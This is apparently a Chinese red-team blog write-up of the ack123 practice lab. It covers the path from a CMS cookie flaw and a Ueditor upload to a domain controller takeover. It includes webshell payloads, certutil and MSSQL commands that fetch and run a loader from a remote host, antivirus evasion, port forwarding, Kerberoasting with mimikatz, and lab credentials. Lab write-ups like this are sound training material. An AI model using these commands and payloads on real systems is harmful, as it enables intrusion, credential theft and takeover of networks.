---
layout: post
title: "暗月靶场WriteUp"
date: 2022-06-25
author: 2hanx
toc: true
categories: [Red Team]
tags: [暗月靶场]
---

# Web1

## 信息收集

通过目录枚举拿到后台登录地址。

![1]({{ '/ack123/1.png' | prepend: site.url }})

根据该 **HDHCMS** 搜索历史漏洞，知道该cms存在一个逻辑缺陷漏洞，攻击者可利用漏洞通过**构造cookie**即可直接登入后台，获取敏感信息。

![2]({{ '/ack123/2.png' | prepend: site.url }})

未登录的cookie看不到啥信息，那么就尝试注册一个号试试。果然，在登录后响应的cookie中包含一个`AdminCook`字段，其中 `AdminUser`信息表明当前用户，那么结合逻辑漏洞可以知道这里存在垂直越权漏洞。

> 这里需要将之前的cookie信息删除。

![3]({{ '/ack123/3.png' | prepend: site.url }})

![4]({{ '/ack123/4.png' | prepend: site.url }})

## 突破点

在**管理首页**我们注意到站点使用到**百度Ueditor1.4.3** 富文本编辑器，并且该站点是IIS，由此想到该编辑器存在的文件上传漏洞，那么我们接下来就是寻找上传路径。

在编辑文章处需使用到该插件，因此我们可以轻松定位到上传路径。

## Getshell

本地编辑一个`ueditor.html` 文件，修改上传路径。

```html
<form action="http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage"enctype="application/x-www-form-urlencoded"  method="POST">
shell addr: <input type="text" name="source[]" />
 <input type="submit" value="Submit" />
</form>
```

制作一个图形马

```
copy a.jpg + b.aspx shell.aspx  # windows cmd
cat a.jpg b.aspx > shell.aspx	# linux shell
```

上传成功后返回这样：

![5]({{ '/ack123/5.png' | prepend: site.url }})

## 权限维持



## 主机信息收集（web1）

### 数据库信息

```powershell
findstr /s /i "password" *.conf
findstr /s /i "password" *.config
```

在 `C:/Hws.com/HwsHostMaster/wwwroot/www.ackmoon.com/web/HdhApp.config` 文件中找到数据库信息：

```
数据库地址：192.168.22.133
账号：sa
密码：pass123@.com
数据库：DemoHdhCms
```

![6]({{ '/ack123/6.png' | prepend: site.url }})

### 内网IP信息

该计算机的内网IP是：`192.168.22.128`

### 进程信息

查看进程信息，发现存在360杀软，之后上传后门时我们就要针对性绕过杀软。

![7]({{ '/ack123/7.png' | prepend: site.url }})

### 系统信息

通过比对 `systeminfo` 信息，找到可提权的漏洞。

![8]({{ '/ack123/8.png' | prepend: site.url }})

## 上线CS

为了更好的内网渗透，我们使用CS工具进行后续步骤，因此首先我们得绕过杀软，上传cs后门。这里我使用简单 xor 算法加密payload。

这里使用 `certutil.exe` 工具下载文件时会被360告警，导致下载中断。因此我们使用之前的上传漏洞即可。

## 提权

通过烂土豆提权，即Erebus 插件中的MS16-075进行提权。

## 连接数据库

通过cs的默认socks4代理，并且本机上的DBeaver数据库连接工具通过proxifer转发代理，已连接内网数据库。

![9]({{ '/ack123/9.png' | prepend: site.url }})

# Data1

## 主机信息收集（Data1）

mssql执行命令，依旧对该数据库服务器进行一波信息收集。

![10]({{ '/ack123/10.png' | prepend: site.url }})

> xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中默认禁止，如果用户拥有管理员 sa 权限可以用 sp_configure 重新开启

### 系统信息

通过比对 `systeminfo` 信息，找到可提权的漏洞，比如ms16-075。

### 内网IP信息

```sql
EXEC master..xp_cmdshell 'ipconfig';
```

根据执行的命令可知该计算机的内网IP有：`192.168.22.133`、`192.168.76.107`。

### 进程信息

查看进程信息，发现存在火绒。

## 上线CS

使用 `certutil.exe` 远程下载加载器，但火绒拦截导致失败了。

```sql
EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://xxx.xxx.xxx.xxx:8899/demo.exe C:\Windows\Temp\loader.exe';
```

根据[这篇文章](https://xz.aliyun.com/t/9265)利用mssql上线CS。

```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures',1;
RECONFIGURE;
declare @o int EXEC sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'C:/Windows/System32/certutil.exe','C:/windows/temp/sethc.exe';
declare @shell int exec sp_oacreate 'wscript.shell', @shell output exec sp_oamethod @shell,'run',null,'C:/windows/temp/sethc.exe -urlcache -split -f "http://xxx.xxx.xxx.xxx:8899/demo.exe" C:/windows/temp/a.exe';
EXEC master..xp_cmdshell "C:/windows/temp/a.exe";
```

## 提权

通过烂土豆提权，即Erebus 插件中的MS16-075进行提权。

![11]({{ '/ack123/11.png' | prepend: site.url }})

# Web2

通过扫描`192.168.22.133`所在段，发现存在IP：`192.168.22.135`，并且开放端口：`80`。

![12]({{ '/ack123/12.png' | prepend: site.url }})

根据提示信息使用账号密码：`demo:demo`登录，抓包查看登录请求，发现`X-token:`字段是通过JWT加密，解密发现其中存在字段`username`，因此我们可以尝试`admin`登录，即需要伪造该`X-token`字段，前提是我们需要知道`secret`。

![13]({{ '/ack123/13.png' | prepend: site.url }})

![14]({{ '/ack123/14.png' | prepend: site.url }})

使用 [jwt_tool](https://github.com/ticarpi/jwt_tool) 工具进行爆破，得到key：`Qweasdzxc5`。

```powershell
python3 .\jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC8xMC4xMC4xLjEzNSIsImF1ZCI6Imh0dHA6XC9cLzEwLjEwLjEuMTM1IiwiaWF0IjoxNjU2MTY3MzkxLCJuYmYiOjE2NTYxNjc0MDEsImV4cCI6MTY1NjE2Nzk5MSwiZGF0YSI6eyJ1c2VyaWQiOjEsInVzZXJuYW1lIjoiZGVtbyJ9fQ.onkSqSV6U5EMbF33V-BE5Z5c_Apbw0sXemZHhIzx4g0 -C -d rockyou.txt
```

![15]({{ '/ack123/15.png' | prepend: site.url }})

之后通过 [jwt](https://jwt.io/) 网站生成用户 `admin` 的token并进行登录，结果没其他功能。嗯~，那么这个key估计是用在其他地方了。

![16]({{ '/ack123/16.png' | prepend: site.url }})

通过 wappalyzer 工具发现识别出 phpmyadmin 数据库管理器，经过爆破得到路径，并且刚好是这个数据库登录密码。

![17]({{ '/ack123/17.png' | prepend: site.url }})

## Getshell

接下来就是mysql getshell操作，我们知道有两种方法getshell：

1. outfile和dumpfile写shell

   - 前提条件：

     1. 数据库当前用户为root权限；

     2. 知道当前网站的绝对路径；

     3. `PHP`的`GPC`为 off状态；(魔术引号，GET，POST，Cookie)；

     4. 写入的那个路径存在写入权限。

        - 查询`secure_file_prive`的参数：

          ```sql
          show global variables like "%secure%"
          ```

          > `secure_file_prive=` ，结果为空的话，表示允许任何文件读写
          >
          > `secure_file_prive=NULL`，表示不允许任何文件读写
          >
          > `secure_file_prive=某个路径`，表示这个路径作为文件读写的路径
          >
          > 在 mysql5.5 版本前，都是默认为空，允许读取；
          >
          > 在mysql5.6版本后 ,默认为`NULL`，并且无法用SQL语句对其进行修改。所以这种只能在配置进行修改。

          因此这里不满足条件，只能通过日志来getshell。

2. 日志getshell

```
set global general_log='on'; #开启日志
set global general_log_file='C:\\phpstudy_pro\\WWW\\b.php'; #设置日志位置为网站目录
select '<?php @eval($_POST["isok"]); ?>'; #写马
```

## 主机信息收集（web2）

### 系统信息

通过比对 `systeminfo` 信息，找到可提权的漏洞，比如ms16-075。

### 内网IP信息

根据执行的命令可知该计算机的内网IP有：`192.168.22.135`、`10.10.10.138`。并且发现该主机存在**域环境**。

![18]({{ '/ack123/18.png' | prepend: site.url }})

### 进程信息

查看进程信息，发现没有杀软。

## 上线CS

发现该主机不出网，因此我们需要做端口转发。那么使用 [goproxy](https://snail007.host900.com/goproxy/manual/zh/#/) 工具在`data1` 主机上做端口转发：

```powershell
shell c:/windows/temp/sethc.exe -urlcache -split -f http://xxx.xxx.xxx.xxx:8899/proxy.exe c:\windows\temp\proxy.exe
shell c:/windows/temp/proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
netsh interface portproxy add v4tov4 listenaddress=192.168.22.133 listenport=8888 connectaddress=192.168.76.107 connectport=8080
```

这里我们将不出网的`192.168.22.133`段转发到出网的`192.168.76.107`所在段，那么我们在CS监听器中这样设置，http proxy 部分是内网转发端口，此外注意生成的exe需选择 **Windows Executalbe（S)**。

![19]({{ '/ack123/19.png' | prepend: site.url }})

## 提权

因为web权限直接是`system`权限，那么就不需要提权了。

# 域环境渗透

## 凭证获取（web2）

![20]({{ '/ack123/20.png' | prepend: site.url }})

## SPN扫描（web2）

```shell
beacon> shell setspn -T ack123.com -q */*
```

```
beacon> shell setspn -T ack123.com -q */*
[*] Tasked beacon to run: setspn -T ack123.com -q */*
[+] host called home, sent: 58 bytes
[+] received output:
正在检查域 DC=ack123,DC=com
CN=Administrator,CN=Users,DC=ack123,DC=com
	mysql/16server-dc1.ack123.com
CN=16SERVER-DC1,OU=Domain Controllers,DC=ack123,DC=com
	Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/16server-dc1.ack123.com
	ldap/16server-dc1.ack123.com/ForestDnsZones.ack123.com
	ldap/16server-dc1.ack123.com/DomainDnsZones.ack123.com
	DNS/16server-dc1.ack123.com
	GC/16server-dc1.ack123.com/ack123.com
	RestrictedKrbHost/16server-dc1.ack123.com
	RestrictedKrbHost/16SERVER-DC1
	RPC/fc2c7a98-defb-4143-8052-ec1832c2a8f0._msdcs.ack123.com
	HOST/16SERVER-DC1/ACK123
	HOST/16server-dc1.ack123.com/ACK123
	HOST/16SERVER-DC1
	HOST/16server-dc1.ack123.com
	HOST/16server-dc1.ack123.com/ack123.com
	E3514235-4B06-11D1-AB04-00C04FC2DCD2/fc2c7a98-defb-4143-8052-ec1832c2a8f0/ack123.com
	ldap/16SERVER-DC1/ACK123
	ldap/fc2c7a98-defb-4143-8052-ec1832c2a8f0._msdcs.ack123.com
	ldap/16server-dc1.ack123.com/ACK123
	ldap/16SERVER-DC1
	ldap/16server-dc1.ack123.com
	ldap/16server-dc1.ack123.com/ack123.com
CN=krbtgt,CN=Users,DC=ack123,DC=com
	kadmin/changepw
CN=12SERVER-DATA2,CN=Computers,DC=ack123,DC=com
	WSMAN/12server-data2
	WSMAN/12server-data2.ack123.com
	RestrictedKrbHost/12SERVER-DATA2
	HOST/12SERVER-DATA2
	RestrictedKrbHost/12server-data2.ack123.com
	HOST/12server-data2.ack123.com
CN=12SERVER-WEB2,CN=Computers,DC=ack123,DC=com
	TERMSRV/12SERVER-WEB2
	TERMSRV/12server-web2.ack123.com
	WSMAN/12server-web2
	WSMAN/12server-web2.ack123.com
	RestrictedKrbHost/12SERVER-WEB2
	HOST/12SERVER-WEB2
	RestrictedKrbHost/12server-web2.ack123.com
	HOST/12server-web2.ack123.com

发现存在 SPN!
```

mimikatz 申请创建票据，票据为**RC4加密**，所以可以通过**爆破**的方式得到服务对应用户的密码。

```
beacon> mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com
```

```
beacon> mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com
[*] Tasked beacon to run mimikatz's kerberos::ask /target:mysql/16server-dc1.ack123.com command
[+] host called home, sent: 750703 bytes
[+] received output:
Asking for: mysql/16server-dc1.ack123.com
   * Ticket Encryption Type & kvno not representative at screen

	   Start/End/MaxRenew: 2022/6/26 18:45:53 ; 2022/6/27 4:24:32 ; 2022/7/3 18:24:32
	   Service Name (02) : mysql ; 16server-dc1.ack123.com ; @ ACK123.COM
	   Target Name  (02) : mysql ; 16server-dc1.ack123.com ; @ ACK123.COM
	   Client Name  (01) : 12SERVER-WEB2$ ; @ ACK123.COM
	   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     7e76b3a78c2f06ff268007883a813f26
	   Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 0	[...]
```

## 凭证获取

```
beacon> mimikatz kerberos::list
```

```
beacon> mimikatz kerberos::list
[*] Tasked beacon to run mimikatz's kerberos::list command
[+] host called home, sent: 750704 bytes
[+] received output:

[00000000] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2022/6/26 18:35:23 ; 2022/6/27 4:24:32 ; 2022/7/3 18:24:32
   Server Name       : krbtgt/ACK123.COM @ ACK123.COM
   Client Name       : 12server-web2$ @ ACK123.COM
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 

[00000001] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2022/6/26 18:24:32 ; 2022/6/27 4:24:32 ; 2022/7/3 18:24:32
   Server Name       : krbtgt/ACK123.COM @ ACK123.COM
   Client Name       : 12server-web2$ @ ACK123.COM
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2022/6/26 18:45:53 ; 2022/6/27 4:24:32 ; 2022/7/3 18:24:32
   Server Name       : mysql/16server-dc1.ack123.com @ ACK123.COM
   Client Name       : 12server-web2$ @ ACK123.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 

[00000003] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2022/6/26 18:35:23 ; 2022/6/27 4:24:32 ; 2022/7/3 18:24:32
   Server Name       : cifs/16server-dc1.ack123.com @ ACK123.COM
   Client Name       : 12server-web2$ @ ACK123.COM
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000004] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2022/6/26 18:35:23 ; 2022/6/27 4:24:32 ; 2022/7/3 18:24:32
   Server Name       : 12SERVER-WEB2$ @ ACK123.COM
   Client Name       : 12server-web2$ @ ACK123.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 

[00000005] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2022/6/26 18:24:32 ; 2022/6/27 4:24:32 ; 2022/7/3 18:24:32
   Server Name       : ldap/16server-dc1.ack123.com/ACK123.COM @ ACK123.COM
   Client Name       : 12server-web2$ @ ACK123.COM
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000006] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2021/8/27 13:26:48 ; 2021/8/27 19:55:24 ; 2021/9/3 9:55:24
   Server Name       : LDAP/16server-dc1.ack123.com @ ACK123.COM
   Client Name       : 12server-web2$ @ ACK123.COM
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
```

```
mimikatz kerberos::list /export
```

## 凭证爆破

使用[工具](https://github.com/nidem/kerberoast)爆破域管账号，最终得到域管密码：`P@55w0rd!`。

![21]({{ '/ack123/21.png' | prepend: site.url }})

## 哈希传递

新建一个 Payload 为 Beacon SMB 的监听，探测一下存活主机，然后存活主机右键->Jump->psexec64，填写之前获取到的凭据。

![23]({{ '/ack123/23.png' | prepend: site.url }})

![22]({{ '/ack123/22.png' | prepend: site.url }})

## 域控上线

![24]({{ '/ack123/24.png' | prepend: site.url }})

# 疑难解答

1. 上传webshell后执行命令时会被360拦截，可以尝试换大马，例如*icesword.aspx*。
